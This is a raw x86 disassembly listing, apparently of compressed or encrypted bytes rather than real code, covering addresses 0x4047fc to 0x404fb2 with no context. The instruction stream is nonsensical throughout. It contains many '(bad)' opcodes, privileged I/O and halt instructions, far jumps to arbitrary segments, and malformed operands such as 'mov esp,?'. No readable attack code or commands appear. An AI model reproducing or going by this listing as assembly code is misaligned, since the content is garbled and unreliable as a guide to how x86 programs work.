  4047fc:	jge    0x4047e1
  4047fe:	rol    BYTE PTR [eax+0xc0850c2],0x2
  404805:	mov    DWORD PTR [eax+0x4005f898],esp
  40480b:	lahf   
  40480c:	aas    
  40480d:	je     0x4047ed
  40480f:	imul   eax,DWORD PTR [ebx],0xffffffaa
  404812:	mov    ebp,0xe6f9eb0f
  404817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404818:	dec    ebx
  404819:	push   esi
  40481a:	arpl   si,sp
  40481c:	in     eax,dx
  40481d:	aas    
  40481e:	xchg   ecx,eax
  40481f:	xchg   ebp,eax
  404820:	popa   
  404821:	es pop ss
  404823:	icebp  
  404824:	cli    
  404825:	push   ss
  404826:	fsubr  QWORD PTR [ebx-0x6b]
  404829:	jge    0x40484f
  40482b:	mov    BYTE PTR [edi+0x1e],dh
  40482e:	cmp    esi,DWORD PTR [eax-0x80]
  404831:	aas    
  404832:	fcomp  DWORD PTR [edi-0x4fd16f43]
  404838:	dec    edx
  404839:	mov    ecx,0x48975abc
  40483e:	ret    0xf174
  404841:	(bad)  
  404843:	or     ecx,ebx
  404845:	iret   
  404846:	pop    edx
  404847:	stos   DWORD PTR es:[edi],eax
  404848:	hlt    
  404849:	enter  0xd0fc,0xd2
  40484d:	test   bh,al
  40484f:	std    
  404850:	out    0x8,eax
  404852:	fld    QWORD PTR [esi+0x51c300b]
  404858:	scas   eax,DWORD PTR es:[edi]
  404859:	jmp    0xefe06cf3
  40485e:	(bad)
  404861:	js     0x404829
  404863:	fnstenv [ebx+0xe]
  404866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404867:	adc    al,0x4f
  404869:	mov    ecx,DWORD PTR ds:0x2f5a0a50
  40486f:	lods   al,BYTE PTR ds:[esi]
  404870:	or     eax,DWORD PTR [edx-0xb3dc7e0]
  404876:	and    DWORD PTR [esi+0x11],eax
  404879:	retf   
  40487a:	mov    ch,0xdb
  40487c:	xchg   ebx,eax
  40487d:	ins    DWORD PTR es:[edi],dx
  40487e:	sub    ah,BYTE PTR [ebp-0x77a2119]
  404884:	int3   
  404885:	in     al,dx
  404886:	icebp  
  404887:	xor    DWORD PTR [eax-0x3a],edi
  40488a:	xor    eax,0xaddf47a2
  40488f:	in     al,0x3c
  404891:	(bad)  
  404892:	cdq    
  404893:	les    esi,FWORD PTR [eax]
  404895:	fs jno 0x404832
  404898:	inc    esp
  404899:	shl    cl,0x78
  40489c:	mov    edi,0x74b83cb6
  4048a1:	add    eax,0xc40d77c4
  4048a6:	push   edi
  4048a7:	es pushf 
  4048a9:	stos   BYTE PTR es:[edi],al
  4048aa:	rol    DWORD PTR [edi+0x2884bb51],cl
  4048b0:	repnz pop ebx
  4048b2:	pop    es
  4048b3:	leave  
  4048b4:	cld    
  4048b5:	jno    0x4048e4
  4048b7:	call   0x1457:0x38cebb00
  4048be:	push   ebp
  4048bf:	(bad)  
  4048c0:	enter  0xe68a,0x83
  4048c4:	mov    gs,WORD PTR [ebx+0x41e0ebe1]
  4048ca:	sbb    esp,edi
  4048cc:	jae    0x404915
  4048ce:	sub    cl,dh
  4048d0:	lahf   
  4048d1:	cmp    ch,BYTE PTR [eax+0x5c]
  4048d4:	jmp    0x7ec62452
  4048d9:	lods   eax,DWORD PTR ds:[esi]
  4048da:	outs   dx,DWORD PTR ds:[esi]
  4048db:	cld    
  4048dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048dd:	out    dx,eax
  4048de:	int3   
  4048df:	dec    esi
  4048e0:	outs   dx,BYTE PTR ds:[esi]
  4048e1:	and    DWORD PTR [edx],esp
  4048e3:	jge    0x404884
  4048e5:	retf   
  4048e6:	mov    al,bl
  4048e8:	pop    esi
  4048e9:	pop    ecx
  4048ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048eb:	jmp    0x584ab13d
  4048f0:	inc    ebp
  4048f1:	mov    esp,0x92c29826
  4048f6:	sub    DWORD PTR [eax-0x3986ce5e],eax
  4048fc:	xlat   BYTE PTR ds:[ebx]
  4048fd:	repz sub ebp,eax
  404900:	out    0x42,al
  404902:	xchg   ebx,eax
  404903:	outs   dx,DWORD PTR ds:[esi]
  404904:	dec    BYTE PTR [ecx-0x66]
  404907:	jp     0x4048af
  404909:	iret   
  40490a:	dec    edi
  40490b:	adc    ebx,ebp
  40490d:	loope  0x4048fc
  40490f:	adc    dh,BYTE PTR [eax]
  404911:	mov    edi,DWORD PTR [eax-0x5e80ca82]
  404917:	movq   mm3,mm7
  40491a:	or     eax,0x56e2c6c8
  40491f:	mov    ah,0x27
  404921:	test   bh,ah
  404923:	into   
  404924:	retf   
  404925:	rol    DWORD PTR [ecx-0x1d4765b4],cl
  40492b:	pop    es
  40492c:	inc    edi
  40492d:	stos   DWORD PTR es:[edi],eax
  40492e:	inc    eax
  40492f:	ss push edx
  404931:	aas    
  404932:	add    BYTE PTR [ebx],cl
  404934:	in     eax,0x71
  404936:	inc    ebx
  404937:	je     0x4048bb
  404939:	loopne 0x4048d3
  40493b:	ja     0x40492b
  40493d:	mov    cl,0xc6
  40493f:	cmp    al,0x7a
  404941:	dec    edi
  404942:	(bad)  
  404943:	lahf   
  404944:	jecxz  0x4048cc
  404946:	add    DWORD PTR [edi+esi*4],esp
  404949:	test   BYTE PTR [ebp+0x73],0x78
  40494d:	push   ecx
  40494e:	dec    eax
  40494f:	mov    edx,0xd17e1da4
  404954:	(bad)  
  404956:	cs jmp 0x404916
  404959:	jo     0x404966
  40495b:	fsubr  QWORD PTR [edx+0x43]
  40495e:	sbb    eax,eax
  404960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404961:	mov    WORD PTR [ebp+0xa6ec6f4],fs
  404967:	adc    eax,0x38093ef6
  40496c:	bswap  ebx
  40496e:	cld    
  40496f:	sub    BYTE PTR [ebp+0x9],ch
  404972:	adc    eax,0x4805c108
  404977:	push   edx
  404978:	lahf   
  404979:	mov    ah,0x2f
  40497b:	das    
  40497c:	cdq    
  40497d:	sbb    eax,0xaf3072d8
  404982:	push   es
  404983:	inc    eax
  404984:	cmp    DWORD PTR ds:0xed9b4171,0x62
  40498b:	aad    0xc9
  40498d:	call   0xf0bebfcf
  404992:	mov    ch,0xd7
  404994:	sub    BYTE PTR [ecx-0x6b25c724],al
  40499a:	out    dx,eax
  40499b:	jbe    0x404943
  40499d:	jmp    0xdd4a:0x5c0c6926
  4049a4:	cs pop ebp
  4049a6:	inc    edi
  4049a7:	mov    al,0x3c
  4049a9:	cs repz je 0x404930
  4049ad:	ja     0x4049d4
  4049af:	fs cmp eax,0x6a83a906
  4049b5:	daa    
  4049b6:	mov    ecx,0xf66a0da1
  4049bb:	(bad)  
  4049bc:	sub    dl,BYTE PTR [eax+edi*1-0x33e3d5fe]
  4049c3:	jbe    0x404993
  4049c5:	push   eax
  4049c6:	fs fwait
  4049c8:	cld    
  4049c9:	xchg   esi,eax
  4049ca:	fwait
  4049cb:	cmp    DWORD PTR [esi],0xffffffa7
  4049ce:	mov    ds:0xa78137,al
  4049d3:	out    dx,eax
  4049d4:	jg     0x40498a
  4049d6:	repz (bad) 
  4049d8:	loop   0x4049cc
  4049da:	daa    
  4049db:	cli    
  4049dc:	outs   dx,DWORD PTR ds:[esi]
  4049dd:	sbb    al,0xe3
  4049df:	and    al,0xb1
  4049e1:	sbb    DWORD PTR [edi+0x5b9cf7f3],ebp
  4049e7:	cmp    BYTE PTR [ebx+0x2f],0x35
  4049eb:	(bad)  
  4049ed:	in     eax,dx
  4049ee:	mov    cl,0xc8
  4049f0:	sub    BYTE PTR [ecx+esi*4+0x6c],dl
  4049f4:	cmp    BYTE PTR [eax-0x43],dh
  4049f7:	and    eax,0xa624f1f5
  4049fc:	xor    DWORD PTR [ecx+edi*2],ecx
  4049ff:	ins    BYTE PTR es:[edi],dx
  404a00:	aam    0x15
  404a02:	fs pop eax
  404a04:	jb     0x404a32
  404a06:	fs jecxz 0x404a24
  404a09:	nop
  404a0a:	sbb    eax,ecx
  404a0c:	push   ebx
  404a0d:	stos   DWORD PTR es:[edi],eax
  404a0e:	call   0xbd266438
  404a13:	mov    ecx,0xe3a35d1d
  404a18:	sub    al,0xd4
  404a1a:	add    dl,bh
  404a1c:	push   ebp
  404a1d:	push   ds
  404a1e:	mov    ah,0x53
  404a20:	dec    edi
  404a21:	dec    esp
  404a22:	sub    BYTE PTR [ebp-0x28],0xfb
  404a26:	and    ch,ah
  404a28:	(bad)  
  404a29:	or     BYTE PTR [eax],al
  404a2b:	cmp    BYTE PTR [ecx-0x49a368d6],dh
  404a31:	shr    BYTE PTR ds:0xee032aed,0x1e
  404a38:	test   eax,0xb861271d
  404a3d:	xchg   esi,eax
  404a3e:	sar    DWORD PTR [eax-0x25],1
  404a41:	push   esi
  404a42:	jns    0x404a10
  404a44:	or     eax,0x9b050cc6
  404a49:	int    0xcf
  404a4b:	dec    ebp
  404a4c:	jo     0x404a5a
  404a4e:	mov    ah,0x1f
  404a50:	cdq    
  404a51:	stos   BYTE PTR es:[edi],al
  404a52:	jp     0x404ad0
  404a54:	or     al,0x5e
  404a56:	in     al,dx
  404a57:	gs cdq 
  404a59:	lods   eax,DWORD PTR ds:[esi]
  404a5a:	fs sbb eax,0x4c49a2ad
  404a60:	push   ds
  404a61:	mov    WORD PTR [eax],gs
  404a63:	stos   BYTE PTR es:[edi],al
  404a64:	popf   
  404a65:	pop    edx
  404a66:	in     eax,dx
  404a67:	or     eax,0x2be5b57e
  404a6c:	mov    esi,0x55a6a7d7
  404a71:	and    BYTE PTR [edx],0x4b
  404a74:	add    al,0xd0
  404a76:	inc    ecx
  404a77:	adc    edi,DWORD PTR [ebp+0x579aba38]
  404a7d:	mov    ebp,DWORD PTR [eax+0x24]
  404a80:	cld    
  404a81:	test   BYTE PTR [ecx],ah
  404a83:	div    BYTE PTR [ebx-0x53]
  404a86:	jg     0x404acc
  404a88:	mov    esi,0x84dcabb
  404a8d:	in     eax,0x3f
  404a8f:	stos   BYTE PTR es:[edi],al
  404a90:	jmp    0x404a81
  404a92:	and    al,0xd2
  404a94:	push   ss
  404a95:	xor    edx,ebx
  404a97:	pop    eax
  404a98:	jmp    0x23485933
  404a9d:	jge    0x404acf
  404a9f:	inc    esi
  404aa0:	xchg   ebp,eax
  404aa1:	cli    
  404aa2:	arpl   sp,si
  404aa4:	jl     0x404a30
  404aa6:	jno    0x404ab5
  404aa8:	mov    edx,0x532536b8
  404aad:	out    dx,al
  404aae:	or     DWORD PTR [esp+ebx*4-0x65c11ce0],ecx
  404ab5:	(bad)  
  404ab6:	setp   BYTE PTR [bp+di+0x57a6]
  404abc:	and    al,0x9b
  404abe:	loope  0x404a9d
  404ac0:	dec    esp
  404ac1:	mov    esp,?
  404ac3:	jbe    0x404a90
  404ac5:	dec    edx
  404ac6:	arpl   WORD PTR [ebx+0x62805bfa],sp
  404acc:	jo     0x404a58
  404ace:	add    ebp,DWORD PTR [eax-0x5b474175]
  404ad4:	mov    cs,ecx
  404ad6:	inc    ebp
  404ad7:	fs stos DWORD PTR es:[di],eax
  404ada:	hlt    
  404adb:	or     esp,DWORD PTR [esp+edx*4+0x4a]
  404adf:	fsubr  DWORD PTR [ebp+0x640eb25d]
  404ae5:	jg     0x404a72
  404ae7:	push   ss
  404ae8:	pusha  
  404ae9:	fucomi st,st(5)
  404aeb:	add    eax,0x4decd686
  404af0:	shl    BYTE PTR [ebx-0x42],1
  404af3:	lock dec ebx
  404af5:	sub    BYTE PTR [edi+0x7d8bc420],cl
  404afb:	ja     0x404b52
  404afd:	sub    eax,0xfa6f8327
  404b02:	dec    edi
  404b03:	(bad)  
  404b04:	jle    0x404b21
  404b06:	push   esi
  404b07:	mov    ah,0x8f
  404b09:	xor    eax,0x2
  404b0c:	mov    edi,0x25d4a000
  404b11:	fmul   QWORD PTR [ebp+0x4d126acb]
  404b17:	mov    esi,0xda921d2e
  404b1c:	setp   BYTE PTR [edx-0x68db9a70]
  404b23:	xchg   ch,dh
  404b25:	sbb    ecx,DWORD PTR [edi+0x24]
  404b28:	sbb    al,0xc2
  404b2a:	clc    
  404b2b:	mov    al,ds:0x69bc0369
  404b30:	call   0x8306:0x49764217
  404b37:	mov    cl,0x92
  404b39:	cmp    eax,0x4834e968
  404b3e:	jmp    0x3ecc:0x3b81f369
  404b45:	mov    edi,DWORD PTR [ebx-0xb]
  404b48:	jp     0x404b4a
  404b4a:	out    dx,eax
  404b4b:	mov    ds:0xb7e7cbeb,eax
  404b50:	mov    BYTE PTR [ebx],dl
  404b52:	or     al,0x52
  404b54:	and    eax,0x6194548f
  404b59:	mov    ebx,0xec21864f
  404b5e:	dec    esp
  404b5f:	jno    0x404b43
  404b61:	adc    ecx,DWORD PTR [edi+0x772788a7]
  404b67:	sub    al,0x7c
  404b69:	xchg   esp,eax
  404b6a:	in     al,0xd7
  404b6c:	push   ebp
  404b6d:	es pop ecx
  404b6f:	jl     0x404be9
  404b71:	push   ebp
  404b72:	inc    ebp
  404b73:	or     DWORD PTR [esi],esi
  404b75:	cmc    
  404b76:	cwde   
  404b77:	xchg   BYTE PTR [ecx+ebx*8],al
  404b7a:	outs   dx,DWORD PTR ds:[esi]
  404b7b:	mov    eax,ds:0x816f8aca
  404b80:	cmp    BYTE PTR [edx-0x41],bh
  404b83:	(bad)  
  404b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b85:	add    ch,ah
  404b87:	xchg   esp,eax
  404b88:	inc    edx
  404b89:	mov    al,0x8a
  404b8b:	xor    BYTE PTR [eax+0x1ac6bff5],ah
  404b91:	mov    bl,0xd4
  404b93:	push   ss
  404b94:	mov    esp,0x1192d179
  404b99:	lahf   
  404b9a:	js     0x404b48
  404b9c:	push   eax
  404b9d:	int3   
  404b9e:	mov    dh,0x14
  404ba0:	std    
  404ba1:	lods   eax,DWORD PTR ds:[esi]
  404ba2:	cmp    edx,0x45762996
  404ba8:	cld    
  404ba9:	aad    0xc
  404bab:	pushf  
  404bac:	xchg   ecx,eax
  404bad:	dec    cx
  404baf:	sbb    al,0xe4
  404bb1:	repnz shl BYTE PTR [ebx],1
  404bb4:	sub    al,0xf1
  404bb6:	sbb    dl,BYTE PTR [esi+0x57]
  404bb9:	pop    edi
  404bba:	push   0x7ab5730f
  404bbf:	cmp    BYTE PTR [esp+eiz*2],bl
  404bc2:	mov    cl,BYTE PTR [eax+0x39]
  404bc5:	or     cl,BYTE PTR [esi]
  404bc7:	bnd jp 0x404b84
  404bca:	mov    ebp,0x899a6001
  404bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bd0:	sub    eax,0x728f2135
  404bd5:	or     eax,0x7e70cc4a
  404bda:	retf   
  404bdb:	xlat   BYTE PTR ds:[ebx]
  404bdc:	retf   0x5740
  404bdf:	cmp    eax,0xb948f824
  404be4:	pop    ecx
  404be5:	inc    edx
  404be6:	or     al,0x81
  404be8:	aas    
  404be9:	and    DWORD PTR [esi-0x31e34330],edi
  404bef:	cli    
  404bf0:	mov    BYTE PTR [edi-0x69],dh
  404bf3:	(bad)  
  404bf4:	in     al,dx
  404bf5:	leave  
  404bf6:	jne    0x404bd6
  404bf8:	cvtps2pi mm7,QWORD PTR [ebx]
  404bfb:	dec    edx
  404bfc:	das    
  404bfd:	imul   esp,DWORD PTR [ebp-0x16],0x4c0b527f
  404c04:	add    BYTE PTR [edx*8-0x58cafef1],ah
  404c0b:	loop   0x404c35
  404c0d:	xchg   ebx,eax
  404c0e:	fs gs mov bl,0x20
  404c12:	test   bh,ch
  404c14:	mov    DWORD PTR [edi],esp
  404c16:	int3   
  404c17:	fisubr DWORD PTR [edx]
  404c19:	out    0xab,eax
  404c1b:	jmp    0x404c5a
  404c1d:	leave  
  404c1e:	cmp    ecx,esi
  404c20:	ret    
  404c21:	aad    0x96
  404c23:	cmp    eax,0x7557ed09
  404c28:	imul   ecx,DWORD PTR [esi],0xffffffce
  404c2b:	shr    cl,cl
  404c2d:	or     DWORD PTR [ebx-0x13],edx
  404c30:	lods   al,BYTE PTR ds:[esi]
  404c31:	and    cl,BYTE PTR [ecx]
  404c33:	rol    DWORD PTR [esi+0x6e31adc9],0x58
  404c3a:	ret    
  404c3b:	enter  0x2756,0x35
  404c3f:	pusha  
  404c40:	jae    0x404c6a
  404c42:	xchg   ebx,edx
  404c44:	or     BYTE PTR [esp+edx*2+0x57],dl
  404c48:	and    dh,0xb1
  404c4b:	sub    cl,al
  404c4d:	pop    edi
  404c4e:	mov    esi,DWORD PTR [edi+0x69aefaa2]
  404c54:	xchg   edi,eax
  404c55:	pushf  
  404c56:	inc    ebx
  404c57:	mov    al,ds:0x40f6ae72
  404c5c:	aam    0x61
  404c5e:	out    dx,eax
  404c5f:	cmp    ecx,DWORD PTR ds:0x2c4e1c5d
  404c65:	mov    BYTE PTR [ecx+ebx*8+0x43],ch
  404c69:	mov    ah,0xc4
  404c6b:	das    
  404c6c:	inc    esi
  404c6d:	push   ebx
  404c6e:	enter  0xd447,0x1d
  404c72:	ja     0x404c6b
  404c74:	jge    0x404c19
  404c76:	div    BYTE PTR [esi]
  404c78:	sbb    al,0x3b
  404c7a:	std    
  404c7b:	loopne 0x404cab
  404c7d:	fmul   QWORD PTR [eax+0x19]
  404c80:	(bad)  
  404c81:	retf   0x59c8
  404c84:	inc    ebx
  404c85:	xlat   BYTE PTR ds:[ebx]
  404c86:	sub    BYTE PTR [ebx+0x3cf0ca81],cl
  404c8c:	pmulhw mm3,QWORD PTR [ebx+0xf]
  404c90:	push   cs
  404c91:	imul   ecx,DWORD PTR [ecx-0x7e],0xffffffcc
  404c95:	push   ds
  404c96:	jmp    0x4571:0x7cc2d093
  404c9d:	mov    bh,0xb0
  404c9f:	(bad)  
  404ca1:	jmp    0x9d61:0x5a12deb9
  404ca8:	add    DWORD PTR [ebp-0x7b785339],eax
  404cae:	loopne 0x404c86
  404cb0:	imul   esp,DWORD PTR [ebx+0x1c3a06f2],0x1a378721
  404cba:	cmp    esi,esi
  404cbc:	mov    bl,0x19
  404cbe:	out    dx,eax
  404cbf:	and    DWORD PTR [eax],esi
  404cc1:	dec    esp
  404cc2:	mov    bh,0x20
  404cc4:	and    dh,BYTE PTR ds:0xc97710d8
  404cca:	test   eax,0x639b1b3d
  404ccf:	out    0x6b,eax
  404cd1:	mov    ecx,esp
  404cd3:	dec    esp
  404cd4:	stos   DWORD PTR es:[edi],eax
  404cd5:	push   es
  404cd6:	popa   
  404cd7:	pop    edi
  404cd8:	jno    0x404cc4
  404cda:	clc    
  404cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cdc:	fdivp  st(2),st
  404cde:	js     0x404d17
  404ce0:	cwde   
  404ce1:	and    DWORD PTR [esi],edx
  404ce3:	cdq    
  404ce4:	das    
  404ce5:	cmp    eax,DWORD PTR [edi+eiz*8]
  404ce8:	xor    BYTE PTR [edi],dl
  404cea:	(bad)  
  404ceb:	fist   DWORD PTR [ebx-0x53]
  404cee:	pop    eax
  404cef:	and    al,0xbc
  404cf1:	sub    BYTE PTR [edx],ch
  404cf3:	mul    ebx
  404cf5:	shl    DWORD PTR [ebx+0x48],cl
  404cf8:	stc    
  404cf9:	icebp  
  404cfa:	test   al,0xfc
  404cfc:	adc    al,dl
  404cfe:	test   DWORD PTR [ebx-0x52e41623],eax
  404d04:	outs   dx,DWORD PTR ds:[esi]
  404d05:	adc    ecx,DWORD PTR [esi-0x1b]
  404d08:	xchg   edx,eax
  404d09:	xchg   edi,eax
  404d0a:	jecxz  0x404d68
  404d0c:	sub    al,0xb4
  404d0e:	add    dl,ch
  404d10:	imul   edi,DWORD PTR [edi],0xffffff88
  404d13:	outs   dx,DWORD PTR ds:[esi]
  404d14:	jmp    0x404cea
  404d16:	adc    dh,BYTE PTR [ebx-0x2d6544fe]
  404d1c:	adc    bl,BYTE PTR [ebx-0x3905859]
  404d22:	rcr    cl,1
  404d24:	or     eax,0xe305b22a
  404d29:	add    ebx,DWORD PTR [edx]
  404d2b:	inc    esi
  404d2c:	ja     0x404d27
  404d2e:	sub    al,0x20
  404d30:	int3   
  404d31:	sbb    eax,0x240f91c3
  404d36:	int3   
  404d37:	push   esi
  404d38:	dec    esi
  404d39:	hlt    
  404d3a:	mov    ch,0x7f
  404d3c:	pop    esp
  404d3d:	sar    BYTE PTR [ecx+esi*4+0x4376c289],cl
  404d44:	adc    esp,0xd3d3e4eb
  404d4a:	popf   
  404d4b:	and    al,0x4b
  404d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d4e:	mov    eax,DWORD PTR [edi]
  404d50:	sub    BYTE PTR [ecx-0x46],ch
  404d53:	retf   0x24b7
  404d56:	dec    esp
  404d57:	xor    ah,BYTE PTR [edi]
  404d59:	stos   BYTE PTR es:[edi],al
  404d5a:	mov    esp,0xb04ddd9b
  404d5f:	jecxz  0x404d84
  404d61:	xor    DWORD PTR [eax],edi
  404d63:	popf   
  404d64:	push   edi
  404d65:	fcom   DWORD PTR [eax-0x2f0df688]
  404d6b:	xchg   ebp,eax
  404d6c:	jns    0x404d5d
  404d6e:	icebp  
  404d6f:	repz adc dl,dl
  404d72:	clc    
  404d73:	loopne 0x404d32
  404d75:	aad    0xd0
  404d77:	mov    dh,0xc5
  404d79:	pop    ebp
  404d7a:	test   al,al
  404d7c:	pop    ds
  404d7d:	jmp    0xce2b510e
  404d82:	mov    WORD PTR [ecx-0x56],gs
  404d85:	mov    ds:0x81169876,al
  404d8a:	mov    dl,0x56
  404d8c:	sar    ecx,1
  404d8e:	loop   0x404d28
  404d90:	in     eax,dx
  404d91:	lods   eax,DWORD PTR ds:[esi]
  404d92:	mov    bh,0xce
  404d94:	dec    bl
  404d96:	inc    ecx
  404d97:	cmp    esp,DWORD PTR [ecx+ebx*4-0x49ffda14]
  404d9e:	jmp    0x404dd3
  404da0:	dec    ebx
  404da1:	jp     0x404e0e
  404da3:	dec    edi
  404da4:	test   eax,0x2e60232d
  404da9:	loopne 0x404e22
  404dab:	into   
  404dac:	mov    cl,0x34
  404dae:	pop    ds
  404daf:	stos   DWORD PTR es:[edi],eax
  404db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404db1:	dec    ebx
  404db2:	sbb    al,BYTE PTR [eax*8-0x70a555f9]
  404db9:	push   edi
  404dba:	jl     0x404d7d
  404dbc:	in     al,dx
  404dbd:	adc    ebp,0x24
  404dc0:	pop    edx
  404dc1:	outs   dx,BYTE PTR ss:[esi]
  404dc3:	fbld   TBYTE PTR [ebp*8-0x57e59ce8]
  404dca:	xchg   ebx,eax
  404dcb:	repnz out dx,eax
  404dcd:	call   0xdde2:0x866011a4
  404dd4:	in     al,dx
  404dd5:	mov    ebp,ds
  404dd7:	mov    ch,0x19
  404dd9:	call   0x600c:0x5bd44bc9
  404de0:	(bad)  
  404de2:	(bad)  
  404de3:	shl    BYTE PTR [ecx+0x27e8f360],cl
  404de9:	retf   0x363c
  404dec:	dec    edx
  404ded:	(bad)  
  404dee:	fild   WORD PTR [ebp+0x8e7dd00]
  404df4:	adc    al,0x19
  404df6:	adc    edx,DWORD PTR [edx]
  404df8:	ror    ah,cl
  404dfa:	imul   edx,esi,0xbeac69c6
  404e00:	xchg   DWORD PTR [eax],edi
  404e02:	retf   0xddc4
  404e05:	stc    
  404e06:	in     al,0xb9
  404e08:	sbb    al,0x9e
  404e0a:	mov    al,0x24
  404e0c:	mov    dl,0xc7
  404e0e:	ficomp DWORD PTR es:[ebp-0x29]
  404e12:	mov    gs,WORD PTR ds:0xa1e3c534
  404e18:	xchg   ebp,eax
  404e19:	repnz scas al,BYTE PTR es:[edi]
  404e1b:	(bad)  
  404e1c:	jl     0x404dce
  404e1e:	fadd   st(0),st
  404e20:	fld    DWORD PTR [esi]
  404e22:	jmp    0x6b2e3951
  404e27:	outs   dx,BYTE PTR ds:[esi]
  404e28:	lods   al,BYTE PTR ds:[esi]
  404e29:	add    eax,0x3eac711f
  404e2e:	or     edi,0x15
  404e31:	push   es
  404e32:	call   0x1b05b1cb
  404e37:	mov    ?,esi
  404e39:	ret    0x572d
  404e3c:	iret   
  404e3d:	mov    cl,0x25
  404e3f:	or     ebx,edi
  404e41:	mov    ebp,0x51e6db23
  404e46:	(bad)  
  404e47:	sar    DWORD PTR [ecx-0x391e62eb],1
  404e4d:	int3   
  404e4e:	inc    esi
  404e4f:	aam    0x43
  404e51:	xor    bl,al
  404e53:	popf   
  404e54:	cmp    edi,DWORD PTR [ecx]
  404e56:	(bad)  
  404e58:	pop    ebx
  404e59:	repz (bad) 
  404e5b:	jmp    0x404ea5
  404e5d:	in     al,0x6e
  404e5f:	sbb    cl,0xf6
  404e62:	xor    DWORD PTR [edi+0xcfaed57],edi
  404e68:	sar    DWORD PTR [eax+0x67365687],cl
  404e6e:	mov    ebp,0xe539a58f
  404e73:	cmp    ch,BYTE PTR [ecx]
  404e75:	in     al,0xa4
  404e77:	dec    esi
  404e78:	xlat   BYTE PTR ds:[ebx]
  404e79:	pop    ebp
  404e7a:	mov    esi,ebx
  404e7c:	xor    dl,BYTE PTR [ecx+0x2ce15619]
  404e82:	jns    0x404e0a
  404e84:	inc    ecx
  404e85:	push   esi
  404e86:	adc    eax,0x2da4b3d9
  404e8b:	dec    esi
  404e8c:	add    BYTE PTR ds:0xc5956802,ah
  404e92:	cmc    
  404e93:	cmp    eax,0x98c44e2
  404e98:	mov    esp,0xe79578b7
  404e9d:	adc    ah,BYTE PTR [ebx-0x6379ca4d]
  404ea3:	gs test eax,0x91ee0a18
  404ea9:	(bad)  
  404eaa:	cli    
  404eab:	inc    ebx
  404eac:	std    
  404ead:	add    DWORD PTR [ebp+ebp*4-0x7c],0x70
  404eb2:	ins    BYTE PTR es:[edi],dx
  404eb3:	outs   dx,DWORD PTR ds:[esi]
  404eb4:	(bad)  
  404eb5:	cld    
  404eb6:	add    cl,dl
  404eb8:	popf   
  404eb9:	jno    0x404e4d
  404ebb:	jae    0x404eb2
  404ebd:	jae    0x404eb3
  404ebf:	shr    DWORD PTR ds:0x17139d9e,cl
  404ec5:	enter  0x3107,0xee
  404ec9:	jno    0x404f46
  404ecb:	ret    
  404ecc:	test   al,0xda
  404ece:	jg     0x404eab
  404ed0:	cdq    
  404ed1:	sbb    DWORD PTR [eax+0x62],esi
  404ed4:	cmp    al,0x1d
  404ed6:	mov    al,0x51
  404ed8:	pop    es
  404ed9:	pop    ss
  404eda:	std    
  404edb:	xchg   eax,esp
  404edd:	je     0x404f3a
  404edf:	lock fcmove st,st(5)
  404ee2:	retf   
  404ee3:	push   ebp
  404ee4:	sahf   
  404ee5:	rol    al,0x54
  404ee8:	push   eax
  404ee9:	ret    0x46e9
  404eec:	push   es
  404eed:	mov    ch,0x15
  404eef:	mov    dh,0x93
  404ef1:	sub    cl,BYTE PTR [ebx-0x43112b0a]
  404ef7:	xlat   BYTE PTR ds:[ebx]
  404ef8:	xlat   BYTE PTR ds:[ebx]
  404ef9:	ins    BYTE PTR es:[edi],dx
  404efa:	dec    ebp
  404efb:	adc    DWORD PTR [ebx],esp
  404efd:	push   ecx
  404efe:	xchg   ebp,eax
  404eff:	push   cs
  404f00:	xor    eax,0xad24346b
  404f05:	add    edi,esp
  404f07:	pop    ebx
  404f08:	sbb    al,BYTE PTR [esp+edx*8+0xd9e3b51]
  404f0f:	js     0x404f0e
  404f11:	lahf   
  404f12:	sbb    BYTE PTR [edi],dl
  404f14:	sub    BYTE PTR [esp+edx*4+0x25],ah
  404f18:	or     ebx,ebp
  404f1a:	retf   0x55a2
  404f1d:	mov    ch,BYTE PTR [ebp+0x53]
  404f20:	je     0x404ee6
  404f22:	mov    ebp,0x8e4ac424
  404f27:	jmp    0x404ecb
  404f29:	sub    eax,0x11534323
  404f2e:	inc    ebx
  404f2f:	adc    ch,dh
  404f31:	rcl    edx,1
  404f33:	loop   0x404eed
  404f35:	nop
  404f36:	or     eax,0x4f25c463
  404f3b:	vaddsd xmm0,xmm5,QWORD PTR [ecx-0x133dae49]
  404f44:	fcmovu st,st(7)
  404f46:	out    dx,eax
  404f47:	ror    cl,1
  404f49:	mov    ah,0x22
  404f4b:	js     0x404f73
  404f4d:	sub    eax,0x575d3ab0
  404f52:	jmp    0x5c85:0xef68f10a
  404f59:	mov    ebp,0x4c476de3
  404f5e:	ins    BYTE PTR es:[edi],dx
  404f5f:	and    al,0x8c
  404f61:	addr16 push edi
  404f63:	and    BYTE PTR [eax+0x12098127],bl
  404f69:	jl     0x404eed
  404f6b:	inc    BYTE PTR [ebp-0x7e]
  404f6e:	dec    esp
  404f6f:	pop    esi
  404f70:	sbb    DWORD PTR [esp+ecx*2-0x4a],ebx
  404f74:	lods   al,BYTE PTR ds:[esi]
  404f75:	add    ah,ah
  404f77:	inc    edx
  404f78:	jno    0x404fef
  404f7a:	ds into 
  404f7c:	adc    esi,ebx
  404f7e:	jmp    0x404ffc
  404f80:	int3   
  404f81:	pusha  
  404f82:	cmp    BYTE PTR [eax-0x54],0xb1
  404f86:	imul   edx,ecx,0x587d42a4
  404f8c:	push   es
  404f8d:	(bad)  
  404f8e:	cmp    eax,0xe4012f8d
  404f93:	mov    ah,0x6a
  404f95:	or     BYTE PTR [edx],bh
  404f97:	ins    BYTE PTR es:[edi],dx
  404f98:	sahf   
  404f99:	out    0x24,eax
  404f9b:	(bad)  
  404f9c:	rol    bl,cl
  404f9e:	ret    
  404f9f:	ret    
  404fa0:	out    dx,al
  404fa1:	pop    ebp
  404fa2:	lahf   
  404fa3:	mov    ebp,0x419a3f93
  404fa8:	mov    dl,0xe
  404faa:	xor    bh,BYTE PTR [ecx]
  404fac:	xor    BYTE PTR [eax-0x4d739cc2],bh
  404fb2:	inc    esi
